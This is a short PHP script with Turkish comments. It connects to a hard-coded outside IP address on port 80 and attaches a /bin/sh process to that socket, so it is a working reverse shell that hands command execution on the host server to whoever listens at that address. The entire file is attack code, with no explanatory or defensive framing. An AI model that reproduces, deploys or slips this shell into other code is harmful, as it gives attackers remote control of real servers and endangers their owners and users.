<?php

$ip = '45.67.228.28'; // Bağlanılacak IP adresi
$port = 80; // Bağlanılacak Port
$socket = fsockopen($ip, $port, $errno, $errstr, 30);

if (!$socket) {
    die("Bağlantı başarısız: $errstr ($errno)\n");
}

stream_set_timeout($socket, 1);
stream_set_blocking($socket, 0);

$descriptorspec = array(
    0 => $socket, // Giriş soketi (Kullanıcıdan gelen veri)
    1 => $socket, // Çıkış soketi (Komut çıktısı)
    2 => $socket  // Hata soketi (Hata mesajları)
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);

if (!is_resource($process)) {
    die("Shell başlatılamadı.\n");
}

while (true) {
    $read = array($socket);
    $write = null;
    $except = null;

    if (stream_select($read, $write, $except, 0) > 0) {
        $input = fread($socket, 8192);
        fwrite($pipes[0], $input);
    }

    $stdout = stream_get_contents($pipes[1]);
    $stderr = stream_get_contents($pipes[2]);

    fwrite($socket, $stdout . $stderr);

    if (feof($socket)) {
        break;
    }
}

fclose($socket);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
